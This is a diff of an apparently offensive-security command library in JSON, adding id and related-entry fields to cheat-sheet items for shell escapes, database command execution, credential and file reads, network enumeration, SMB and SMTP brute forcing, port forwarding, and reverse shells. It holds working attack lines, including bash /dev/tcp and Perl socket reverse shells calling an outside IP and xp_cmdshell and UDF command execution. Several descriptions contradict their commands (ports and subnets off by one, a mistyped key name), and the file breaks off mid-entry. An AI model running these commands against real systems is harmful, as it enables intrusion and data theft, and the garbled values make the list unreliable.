       "Name": "Vim Escape TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell from within Vi/Vim",
       "Command": ":!bash",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 86,
+      "related": [
+        78,
+        79,
+        80,
+        81,
+        87
+      ]
     },
     {
       "Name": "Vim Set Shell TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell from within Vi/Vim by setting shell",
       "Command": ":set shell=/bin/bash:shell",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 87,
+      "related": [
+        78,
+        79,
+        80,
+        81,
+        86
+      ]
     },
     {
       "Name": "Nano Escape TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell from within Nano editor",
       "Command": "CTRO+R CTRL+X reset; /bin/bash 1>&0 2>&0",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 88,
+      "related": [
+        78,
+        79,
+        80,
+        81,
+        86
+      ]
     },
     {
       "Name": "Nmap Escape TTY",
       "Category": 11,
       "Description": "Spawns an interactive BASH TTY shell from within Nmap",
       "Command": "!bash",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 89,
+      "related": [
+        78,
+        79,
+        80,
+        81,
+        87
+      ]
     },
     {
       "Name": "Export MySQL Table to File",
       "Category": 18,
       "Description": "Export a MySQL table's contents to a server-side file using SELECT INTO OUTFILE, creating a dump for exfiltration or local analysis in Linux priv-esc chains.",
       "Command": "SELECT * FROM table_name INTO OUTFILE '/tmp/dump.sql';",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 90,
+      "related": [
+        91,
+        92,
+        93,
+        94,
+        95
+      ]
     },
     {
       "Name": "Execute MySQL Shell UDF",
       "Category": 18,
       "Description": "Load a custom UDF to execute OS shell commands via MySQL if file privileges allow, enabling arbitrary command execution post-database compromise.",
       "Command": "CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'; SELECT sys_exec('whoami');",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 91,
+      "related": [
+        90,
+        92,
+        93,
+        94,
+        95
+      ]
     },
     {
       "Name": "Load System File into MySQL",
       "Category": 18,
       "Description": "Ingest a system file like /etc/passwd into a MySQL table using LOAD DATA INFILE for enumeration of user accounts in escalated DB access.",
       "Command": "LOAD DATA INFILE '/etc/passwd' INTO TABLE temp_table FIELDS TERMINATED BY ':';",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 92,
+      "related": [
+        90,
+        91,
+        93,
+        94,
+        95
+      ]
     },
     {
       "Name": "Export MSSQL Table to File",
       "Category": 19,
       "Description": "Export MSSQL table data to a BCP file for offline analysis, leveraging xp_cmdshell or OPENROWSET to write dumps during cross-platform priv-esc.",
       "Command": "EXEC xp_cmdshell 'bcp \"SELECT * FROM database.dbo.table_name\" queryout \"C:\\temp\\dump.txt\" -c -T';",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 93,
+      "related": [
+        90,
+        91,
+        92,
+        94,
+        95
+      ]
     },
     {
       "Name": "Execute MSSQL Shell Command",
       "Category": 19,
       "Description": "Execute arbitrary OS commands on the MSSQL host using xp_cmdshell, bridging database access to system shell for Linux-like escalation from Windows.",
       "Command": "EXEC xp_cmdshell 'whoami';",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 94,
+      "related": [
+        90,
+        91,
+        92,
+        93,
+        95
+      ]
     },
     {
       "Name": "Read System File into MSSQL",
       "Category": 19,
       "Description": "Incorporate Windows system files like SAM or hosts into MSSQL queries via OPENROWSET for credential or config enumeration in pivoted environments.",
       "Command": "SELECT * FROM OPENROWSET('SQLOLEDB','Server=.;Trusted_Connection=yes;','BULK C:\\Windows\\System32\\drivers\\etc\\hosts');",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 95,
+      "related": [
+        90,
+        91,
+        92,
+        93,
+        94
+      ]
     },
     {
       "Name": "Copy Postgres Table to File",
       "Category": 20,
       "Description": "Copy a PostgreSQL table's data to a CSV file on the server using COPY command, enabling file-based exfiltration in Linux priv-esc ops.",
       "Command": "COPY (SELECT * FROM table_name) TO '/tmp/dump.csv' WITH CSV HEADER;",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 96,
+      "related": [
+        97,
+        98,
+        99,
+        100,
+        101
+      ]
     },
     {
       "Name": "Execute Postgres Shell Command",
       "Category": 20,
       "Description": "Execute system commands via a custom PL/Python function or extension in PostgreSQL, turning DB access into shell execution for escalation.",
       "Command": "CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS text AS   import subprocess; return subprocess.check_output($1, shell=True)   LANGUAGE plpythonu; SELECT sys_exec('whoami');",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 97,
+      "related": [
+        96,
+        98,
+        99,
+        100,
+        101
+      ]
     },
     {
       "Name": "Read System File in Postgres",
       "Category": 20,
       "Description": "Read a system file like /etc/passwd directly into PostgreSQL output using pg_read_file, requiring superuser perms for sensitive file enumeration in priv-esc.",
       "Command": "SELECT pg_read_file('/etc/passwd');",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 98,
+      "related": [
+        96,
+        97,
+        99,
+        100,
+        101
+      ]
     },
     {
       "Name": "List MySQL Databases",
       "Category": 18,
       "Description": "Enumerate all accessible databases in a MySQL instance, often running as a privileged service, to identify targets for data exfiltration during Linux privilege escalation.",
       "Command": "SHOW DATABASES;",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 99,
+      "related": [
+        90,
+        91,
+        92,
+        100,
+        101
+      ]
     },
     {
       "Name": "Select MySQL Database",
       "Category": 18,
       "Description": "Switch to a specific database context in MySQL to prepare for table enumeration and querying, facilitating deeper reconnaissance in post-exploitation scenarios.",
       "Command": "USE database_name;",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 100,
+      "related": [
+        90,
+        91,
+        92,
+        93,
+        94
+      ]
     },
     {
       "Name": "List MySQL Tables",
       "Category": 18,
       "Description": "List all tables within the current MySQL database to map schema and pinpoint sensitive data stores exploitable via escalated database access.",
       "Command": "SHOW TABLES;",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 101,
+      "related": [
+        90,
+        91,
+        92,
+        99,
+        100
+      ]
     },
     {
       "Name": "Describe MySQL Table Structure",
       "Category": 18,
       "Description": "Display column details for a MySQL table to understand data structure and types, aiding in targeted SQL injection or dump operations during priv-esc.",
       "Command": "DESCRIBE table_name;",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 102,
+      "related": [
+        90,
+        91,
+        92,
+        99,
+        100
+      ]
     },
     {
       "Name": "List MySQL Table Columns",
       "Category": 18,
       "Description": "Retrieve column names and types from a MySQL table for schema analysis, essential for crafting precise queries in compromised database environments.",
       "Command": "SHOW COLUMNS FROM table_name;",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 103,
+      "related": [
+        90,
+        91,
+        92,
+        99,
+        100
+      ]
     },
     {
       "Name": "Query All MySQL Records",
       "Category": 18,
       "Description": "Query all records from a MySQL table to dump data, leveraging privileged DB access gained through Linux service exploitation for credential harvesting.",
       "Command": "SELECT * FROM table_name;",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 104,
+      "related": [
+        90,
+        91,
+        92,
+        99,
+        100
+      ]
     },
     {
       "Name": "List MySQL Users",
       "Category": 18,
       "Description": "Extract user accounts from MySQL's system tables to identify high-priv users or hashes for further escalation in integrated auth scenarios.",
       "Command": "SELECT user, host FROM mysql.user;",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 105,
+      "related": [
+        90,
+        91,
+        92,
+        99,
+        100
+      ]
     },
     {
       "Name": "List MySQL Processes",
       "Category": 18,
       "Description": "List active MySQL connections and queries to spot admin sessions or inject into running processes during post-exploitation pivoting.",
       "Command": "SHOW PROCESSLIST;",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 106,
+      "related": [
+        90,
+        91,
+        92,
+        99,
+        100
+      ]
     },
     {
       "Name": "List MSSQL Databases",
       "Category": 19,
       "Description": "List all databases in an MSSQL instance via system views, targeting Windows-integrated services exploitable from Linux priv-esc for lateral data access.",
       "Command": "SELECT name FROM sys.databases;",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 107,
+      "related": [
+        93,
+        94,
+        95,
+        108,
+        109
+      ]
     },
     {
       "Name": "Select MSSQL Database",
       "Category": 19,
       "Description": "Set the current database context in MSSQL to enable table and schema enumeration in compromised SQL Server environments during escalation chains.",
       "Command": "USE database_name;",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 108,
+      "related": [
+        93,
+        94,
+        95,
+        107,
+        109
+      ]
     },
     {
       "Name": "List MSSQL Tables",
       "Category": 19,
       "Description": "Enumerate tables from MSSQL's information schema to map database structure, crucial for identifying sensitive tables post-Linux-to-Windows pivot.",
       "Command": "SELECT * FROM information_schema.tables WHERE table_type = 'BASE TABLE';",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 109,
+      "related": [
+        93,
+        94,
+        95,
+        107,
+        108
+      ]
     },
     {
       "Name": "List MSSQL Table Columns",
       "Category": 19,
       "Description": "Query column metadata in MSSQL for a specific table to analyze data types and constraints, supporting advanced querying in priv-esc dumps.",
       "Command": "SELECT * FROM information_schema.columns WHERE table_name = 'table_name';",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 110,
+      "related": [
+        93,
+        94,
+        95,
+        107,
+        108
+      ]
     },
     {
       "Name": "Query All MSSQL Records",
       "Category": 19,
       "Description": "Retrieve all rows from an MSSQL table for data exfiltration, exploiting elevated DB perms obtained via service account compromise.",
       "Command": "SELECT * FROM table_name;",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 111,
+      "related": [
+        93,
+        94,
+        95,
+        107,
+        108
+      ]
     },
     {
       "Name": "List MSSQL Users",
       "Category": 19,
       "Description": "List database users in MSSQL to uncover privileged accounts or roles for credential reuse in mixed Linux-Windows privilege escalation.",
       "Command": "SELECT name FROM sys.database_principals;",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 112,
+      "related": [
+        93,
+        94,
+        95,
+        107,
+        108
+      ]
     },
     {
       "Name": "List MSSQL Processes",
       "Category": 19,
       "Description": "Display active sessions and queries in MSSQL to detect and potentially hijack admin connections during post-exploitation reconnaissance.",
       "Command": "SELECT * FROM sys.dm_exec_sessions;",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 113,
+      "related": [
+        93,
+        94,
+        95,
+        107,
+        108
+      ]
     },
     {
       "Name": "List Postgres Databases",
       "Category": 20,
       "Description": "List all databases in PostgreSQL using system catalogs, targeting DB services with root-like access for initial mapping in Linux priv-esc.",
       "Command": "\\l",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 114,
+      "related": [
+        96,
+        97,
+        98,
+        115,
+        116
+      ]
     },
     {
       "Name": "Connect Postgres Database",
       "Category": 20,
       "Description": "Connect to a specific PostgreSQL database to switch context for further enumeration, enabling schema exploration post-escalation.",
       "Command": "\\c database_name",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 115,
+      "related": [
+        96,
+        97,
+        98,
+        114,
+        116
+      ]
     },
     {
       "Name": "List Postgres Tables",
       "Category": 20,
       "Description": "Display tables in the current PostgreSQL schema to identify data targets, vital for dumping in compromised DB instances.",
       "Command": "\\dt",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 116,
+      "related": [
+        96,
+        97,
+        98,
+        114,
+        115
+      ]
     },
     {
       "Name": "Describe Postgres Table Structure",
       "Category": 20,
       "Description": "Output detailed structure of a PostgreSQL table, including columns and constraints, to inform targeted extractions during priv-esc.",
       "Command": "\\d table_name",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 117,
+      "related": [
+        96,
+        97,
+        98,
+        114,
+        115
+      ]
     },
     {
       "Name": "List Postgres Table Columns",
       "Category": 20,
       "Description": "Query information schema in PostgreSQL for column details to understand table layout for precise SQL operations in escalated access.",
       "Command": "SELECT * FROM information_schema.columns WHERE table_name = 'table_name';",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 118,
+      "related": [
+        96,
+        97,
+        98,
+        114,
+        115
+      ]
     },
     {
       "Name": "Query All Postgres Records",
       "Category": 20,
       "Description": "Fetch all records from a PostgreSQL table for data harvesting, leveraging superuser perms gained through Linux service exploits.",
       "Command": "SELECT * FROM table_name;",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 119,
+      "related": [
+        96,
+        97,
+        98,
+        114,
+        115
+      ]
     },
     {
       "Name": "List Postgres Users",
       "Category": 20,
       "Description": "Enumerate PostgreSQL roles and users to spot superusers or extract hashes for auth chaining in privilege escalation workflows.",
       "Command": "SELECT rolname FROM pg_roles;",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 120,
+      "related": [
+        96,
+        97,
+        98,
+        114,
+        115
+      ]
     },
     {
       "Name": "List Postgres Processes",
       "Category": 20,
       "Description": "List active connections in PostgreSQL to identify ongoing sessions for potential takeover or monitoring in post-exploitation.",
       "Command": "SELECT * FROM pg_stat_activity;",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 121,
+      "related": [
+        96,
+        97,
+        98,
+        114,
+        115
+      ]
     },
     {
       "Name": "Forward TCP with Socat",
       "Category": 9,
       "Description": "Establish a TCP port forward using socat to listen on local port 2222 and relay connections to a remote SSH server, enabling pivoting in post-exploitation phases of Linux privilege escalation.",
       "Command": "socat -ddd TCP-LISTEN:3333,fork TCP:10.5.179.216:23",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 122,
+      "related": [
+        74,
+        75,
+        76,
+        77,
+        123
+      ]
     },
     {
       "Name": "Scan SMB Ports with Netcat",
       "Category": 7,
       "Description": "Scan the 172.16.178.0/24 subnet for open SMB ports (445) using netcat to identify potential lateral movement targets during Linux priv-esc reconnaissance.",
       "Command": "for i in $(seq 1 254); do nc -nvv -w1 -z 172.17.179.$i 446; done",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 123,
+      "related": [
+        122,
+        124,
+        125,
+        126,
+        127
+      ]
     },
     {
       "Name": "List All Processes",
       "Category": 7,
       "Description": "List all running processes with user details to identify running services, potential injection points, and privilege mismatches for escalation.",
       "Command": "ps aux",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 124,
+      "related": [
+        123,
+        125,
+        126,
+        127,
+        128
+      ]
     },
     {
       "Name": "Show Socket Status",
       "Category": 7,
       "Description": "Scan active network sockets and associated processes to detect listening services and connections for service enumeration in escalation.",
       "Command": "ss -anp",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 125,
+      "related": [
+        123,
+        124,
+        126,
+        127,
+        128
+      ]
     },
     {
       "Name": "Test Port Connectivity Powershell",
       "Category": 7,
       "Description": "Tests connectivity to port 25 (SMTP) on 192.168.50.8 using PowerShell",
       "Command": "Test-NetConnection -Port 26 192.169.51.9",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 126,
+      "related": [
+        127,
+        128,
+        129,
+        130,
+        131
+      ]
     },
     {
       "Name": "Scan UDP SNMP Ports",
       "Category": 7,
       "Description": "Scans for open UDP port 161 (SNMP) across 192.168.50.1-254, saving results to open-snmp.txt",
       "Command": "sudo nmap -sU --open -p 162 192.169.51.1-254 -oG open-snmp.txt",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 127,
+      "related": [
+        126,
+        128,
+        129,
+        130,
+        131
+      ]
     },
     {
       "Name": "Brute SNMP Communities",
       "Category": 7,
       "Description": "Performs SNMP community string brute-forcing using a community list against specified IPs",
       "Command": "onesixtyone -c community -i ips",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 128,
+      "related": [
+        126,
+        127,
+        129,
+        130,
+        131
+      ]
     },
     {
       "Name": "Walk Public SNMP",
       "Category": 7,
       "Description": "Enumerates SNMP data using public community string on 192.168.50.151 with SNMPv1",
       "Command": "snmpwalk -c public -v1 -t 10 192.169.51.152",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 129,
+      "related": [
+        126,
+        127,
+        128,
+        130,
+        131
+      ]
     },
     {
       "Name": "Enum LAN Users SNMP",
       "Category": 7,
       "Description": "Enumerates LAN Manager user information via SNMP on 192.168.50.151 using OID 1.3.6.1.4.1.77.1.2.25",
       "Command": "snmpwalk -c public -v1 192.169.51.152 1.3.6.1.4.1.77.1.2.25",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 130,
+      "related": [
+        126,
+        127,
+        128,
+        129,
+        131
+      ]
     },
     {
       "Name": "List Processes SNMP",
       "Category": 7,
       "Description": "Enumerates running processes via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.25.4.2.1.2",
       "Command": "snmpwalk -c public -v1 192.169.51.152 1.3.6.1.2.1.25.4.2.1.2",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 131,
+      "related": [
+        126,
+        127,
+        128,
+        129,
+        130
+      ]
     },
     {
       "Name": "List Software SNMP",
       "Category": 7,
       "Description": "Enumerates installed software via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.25.6.3.1.2",
       "Command": "snmpwalk -c public -v1 192.169.51.152 1.3.6.1.2.1.25.6.3.1.2",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 132,
+      "related": [
+        126,
+        127,
+        128,
+        129,
+        130
+      ]
     },
     {
       "Name": "List TCP SNMP",
       "Category": 7,
       "Description": "Enumerates TCP connections via SNMP on 192.168.50.151 using OID 1.3.6.1.2.1.6.13.1.3",
       "Command": "snmpwalk -c public -v1 192.169.51.152 1.3.6.1.2.1.6.13.1.3",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 133,
+      "related": [
+        126,
+        127,
+        128,
+        129,
+        130
+      ]
     },
     {
       "Name": "Connect Telnet SMTP",
       "Category": 7,
       "Description": "Initiates a Telnet connection to port 25 (SMTP) on 192.168.50.8",
       "Command": "telnet 192.169.51.9 26",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 134,
+      "related": [
+        126,
+        127,
+        135,
+        136,
+        137
+      ]
     },
     {
       "Name": "Connect Netcat SMTP",
       "Category": 7,
       "Description": "Establishes a connection to port 25 (SMTP) on 192.168.50.8 with verbose output",
       "Command": "nc -nv 192.169.51.9 26",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 135,
+      "related": [
+        126,
+        127,
+        134,
+        136,
+        137
+      ]
     },
     {
       "Name": "Scan Multiple Enum4linux",
       "Category": 7,
       "Description": "Runs enum4linux against a list of specified IPs in the 192.168.192.0/24 subnet",
       "Command": "for i in {254,152,151,149,23,22,21,20,17,15,14,13,12,11,8,9,6}; do enum4linux 192.169.193.$i ; done",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 136,
+      "related": [
+        123,
+        124,
+        125,
+        137,
+        138
+      ]
     },
     {
       "Name": "Verbose Enum4linux Scan",
       "Category": 7,
       "Description": "Runs enum4linux in verbose mode to show underlying commands",
       "Command": "enum4linux -v target-ip",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 137,
+      "related": [
+        136,
+        138,
+        139,
+        140,
+        141
+      ]
     },
     {
       "Name": "Full Enum4linux Scan",
       "Category": 7,
       "Description": "Runs all enum4linux options except dictionary-based share name guessing",
       "Command": "enum4linux -a target-ip",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 138,
+      "related": [
+        136,
+        137,
+        139,
+        140,
+        141
+      ]
     },
     {
       "Name": "List Users Enum4linux",
       "Category": 7,
       "Description": "Lists usernames if the server allows (RestrictAnonymous = 0)",
       "Command": "enum4linux -U target-ip",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 139,
+      "related": [
+        136,
+        137,
+        138,
+        140,
+        141
+      ]
     },
     {
       "Name": "List Users Creds",
       "Category": 7,
       "Description": "Lists all users using provided credentials, bypassing RestrictAnonymous",
       "Command": "enum4linux -u administrator -p password -U target-ip",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 140,
+      "related": [
+        136,
+        137,
+        138,
+        139,
+        141
+      ]
     },
     {
       "Name": "Default RID Enum",
       "Category": 7,
       "Description": "Pulls usernames from default RID range (500-550,1000-1050)",
       "Command": "enum4linux -r target-ip",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 141,
+      "related": [
+        136,
+        137,
+        138,
+        139,
+        140
+      ]
     },
     {
       "Name": "Custom RID Enum",
       "Category": 7,
       "Description": "Pulls usernames using a custom RID range (600-660)",
       "Command": "enum4linux -R 600-660 target-ip",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 142,
+      "related": [
+        136,
+        137,
+        138,
+        139,
+        140
+      ]
     },
     {
       "Name": "List Groups Enum4linux",
       "Category": 7,
       "Description": "Lists groups, with optional username and password support",
       "Command": "enum4linux -G target-ip",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 143,
+      "related": [
+        136,
+        137,
+        138,
+        139,
+        140
+      ]
     },
     {
       "Name": "List Shares Enum4linux",
       "Category": 7,
       "Description": "Lists Windows shares, with optional username and password support",
       "Command": "enum4linux -S target-ip",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 144,
+      "related": [
+        136,
+        137,
+        138,
+        139,
+        140
+      ]
     },
     {
       "Name": "Dict Attack Shares",
       "Category": 7,
       "Description": "Performs dictionary attack on shares if share list retrieval is blocked",
       "Command": "enum4linux -s shares.txt target-ip",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 145,
+      "related": [
+        136,
+        137,
+        138,
+        139,
+        140
+      ]
     },
     {
       "Name": "Get OS Info Enum",
       "Category": 7,
       "Description": "Pulls OS information using smbclient, including service pack version",
       "Command": "enum4linux -o target-ip",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 146,
+      "related": [
+        136,
+        137,
+        138,
+        139,
+        140
+      ]
     },
     {
       "Name": "List Printers Enum",
       "Category": 7,
       "Description": "Pulls information about printers known to the target device",
       "Command": "enum4linux -i target-ip",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 147,
+      "related": [
+        136,
+        137,
+        138,
+        139,
+        140
+      ]
     },
     {
       "Name": "View Domain Shares",
       "Category": 7,
       "Description": "Lists all shared resources on the target domain controller dc01",
       "Command": "net view \\dc01 /all",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 148,
+      "related": [
+        144,
+        145,
+        149,
+        150,
+        151
+      ]
     },
     {
       "Name": "Discover SMB OS",
       "Category": 7,
       "Description": "Scans for SMB services on ports 139 and 445 with OS discovery script on a single host",
       "Command": "nmap -v -p 139,445 --script smb-os-discovery 192.169.51.153",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 149,
+      "related": [
+        123,
+        124,
+        125,
+        148,
+        150
+      ]
     },
     {
       "Name": "Scan NetBIOS Names",
       "Category": 7,
       "Description": "Scans for NetBIOS information on the 192.168.50.0/24 network",
       "Command": "sudo nbtscan -r 192.169.51.0/24",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 150,
+      "related": [
+        149,
+        151,
+        152,
+        153,
+        154
+      ]
     },
     {
       "Name": "Scan SMB Ports",
       "Category": 7,
       "Description": "Scans for SMB services on ports 139 and 445 across a subnet, saving output to smb.txt",
       "Command": "nmap -v -p 139,445 -oG smb.txt 192.169.51.1-254",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 151,
+      "related": [
+        150,
+        152,
+        153,
+        154,
+        155
+      ]
     },
     {
       "Name": "SYN Port Scan",
       "Category": 7,
       "Description": "Port scanning with nmap",
       "Command": "nmap -sS 192.169.193.2",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 152,
+      "related": [
+        150,
+        151,
+        153,
+        154,
+        155
+      ]
     },
     {
       "Name": "Scan Ports Netcat",
       "Category": 7,
       "Description": "Port scanning with netcat",
       "Command": "nc -nvv -w1 -z 192.169.193.152 1-1000",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 153,
+      "related": [
+        150,
+        151,
+        152,
+        154,
+        155
+      ]
     },
     {
       "Name": "UDP Scan Netcat",
       "Category": 7,
       "Description": "UDP Port scanning with netcat",
       "Command": "nc -nvv -u -w1 -z 192.169.193.152 150-200",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 154,
+      "related": [
+        150,
+        151,
+        152,
+        153,
+        155
+      ]
     },
     {
       "Name": "Run Enum4linux",
       "Category": 7,
       "Description": "SMB enumeration",
       "Command": "enum4linux -a 10.10.11.25",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 155,
+      "related": [
+        150,
+        151,
+        152,
+        153,
+        154
+      ]
     },
     {
       "Name": "List SMB Shares",
       "Category": 7,
       "Description": "List SMB shares",
       "Command": "smbclient -L \\\\10.10.11.25 -U anonymous",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 156,
+      "related": [
+        155,
+        157,
+        158,
+        159,
+        160
+      ]
     },
     {
       "Name": "Scan SMB Vulns",
       "Category": 7,
       "Description": "SMB vulnerability scan",
       "Command": "nmap --script smb-vuln* -p 445 10.10.11.25",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 157,
+      "related": [
+        155,
+        156,
+        158,
+        159,
+        160
+      ]
     },
     {
       "Name": "Map SMB Shares",
       "Category": 7,
       "Description": "SMB share mapping",
       "Command": "smbmap -H 10.10.11.25 -u guest -p \"\"",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 158,
+      "related": [
+        155,
+        156,
+        157,
+        159,
+        160
+      ]
     },
     {
       "Name": "Brute SMB Medusa",
       "Category": 7,
       "Description": "Brute force SMB with medusa",
       "Command": "medusa -h 10.10.11.25 -u administrator -P /usr/share/wordlists/rockyou.txt -M smbnt -F",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 159,
+      "related": [
+        155,
+        156,
+        157,
+        158,
+        160
+      ]
     },
     {
       "Name": "Brute SMB Hydra",
       "Category": 7,
       "Description": "Brute force SMB with hydra",
       "Command": "hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.25 smb",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 160,
+      "related": [
+        155,
+        156,
+        157,
+        158,
+        159
+      ]
     },
     {
       "Name": "Brute SMB Ncrack",
       "Category": 7,
       "Description": "Brute force SMB with ncrack",
       "Command": "ncrack -p 445 -u blake -P /usr/share/wordlists/rockyou.txt smb://10.10.11.17",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 161,
+      "related": [
+        159,
+        160,
+        162,
+        163,
+        164
+      ]
     },
     {
       "Name": "Enum RPC Nmap",
       "Category": 7,
       "Description": "RPC enumeration with nmap",
       "Command": "nmap -sS -sV -p 135,139,445 --script=rpc-enum* 10.10.11.3",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 162,
+      "related": [
+        160,
+        161,
+        163,
+        164,
+        165
+      ]
     },
     {
       "Name": "Connect RPC Client",
       "Category": 7,
       "Description": "RPC client enumeration",
       "Command": "rpcclient -U \"\" 10.10.11.25",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 163,
+      "related": [
+        160,
+        161,
+        162,
+        164,
+        165
+      ]
     },
     {
       "Name": "Enum SMTP Users",
       "Category": 7,
       "Description": "SMTP user enumeration",
       "Command": "smtp-user-enum -M VRFY -U /usr/share/wordlists/rockyou.txt -t 10.10.11.15",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 164,
+      "related": [
+        160,
+        161,
+        162,
+        163,
+        165
+      ]
     },
     {
       "Name": "Brute SMTP Medusa",
       "Category": 7,
       "Description": "Brute force SMTP with medusa",
       "Command": "medusa -h target-server -u username -P /path/to/passwords.txt -M smtp -n 25",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 165,
+      "related": [
+        160,
+        161,
+        162,
+        163,
+        164
+      ]
     },
     {
       "Name": "Query DNS Records",
       "Category": 7,
       "Description": "DNS record lookup",
       "Command": "dig <domain> -t any",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 166,
+      "related": [
+        167,
+        168,
+        169,
+        170,
+        171
+      ]
     },
     {
       "Name": "SSH Local Port Forward",
       "Category": 9,
       "Description": "Set up an SSH local port forward to tunnel traffic from local port 4455 to a remote SMB service via a jump host, facilitating access to internal networks post-Linux escalation.",
       "Command": "ssh -N -L 0.0.0.0:5566:172.17.179.218:445 dbadmin@10.5.179.216",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 167,
+      "related": [
+        166,
+        168,
+        169,
+        170,
+        171
+      ]
     },
     {
       "Name": "Bash Reverse Shell",
       "Category": 10,
       "Description": "Creates a reverse shell using bash, tested on Ubuntu 10.10 checkout https://www.revshells.com for more robust shell creation",
       "Command": "bash -i >& /dev/tcp/192.168.1.100/9080 0>&1",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 168,
+      "related": [
+        166,
+        167,
+        169,
+        170,
+        171
+      ]
     },
     {
       "Name": "Perl Reverse Shell",
       "Category": 10,
       "Description": "A short, feature-free Perl reverse shell connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
       "Command": "perl -e 'use Socket;$i=\"192.168.1.100\";$p=2234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 169,
+      "related": [
+        166,
+        167,
+        168,
+        170,
+        171
+      ]
     },
     {
       "Name": "Python Reverse Shell",
       "Category": 10,
